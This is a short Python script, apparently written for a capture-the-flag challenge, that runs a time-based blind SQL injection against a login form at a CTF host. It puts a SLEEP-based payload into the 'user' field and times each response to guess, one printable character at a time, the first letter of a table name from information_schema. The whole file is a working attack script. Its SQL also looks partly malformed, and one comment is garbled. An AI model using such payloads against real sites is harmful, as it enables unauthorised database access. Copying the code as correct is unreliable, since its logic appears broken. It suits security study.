#!/usr/bin/python3

import string
import time

import requests

url = "https://big-blind.hsc.tf/"


for c in string.printable:
	start = time.time()
	r = requests.post(url, data = {"user" : f"a' AND (SELECT * FROM (SELECT(SLEEP(5)))bFvO) AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = '{c}'", "pass" : "a"})

	end = time.time()
	diff = end - start
	print("trying", c, diff)
	#print(r.text)
	#print(diff)

	if(diff < 5):
		#flase co"ndi.
		continue
	else:
		print("HIT**", c)
		break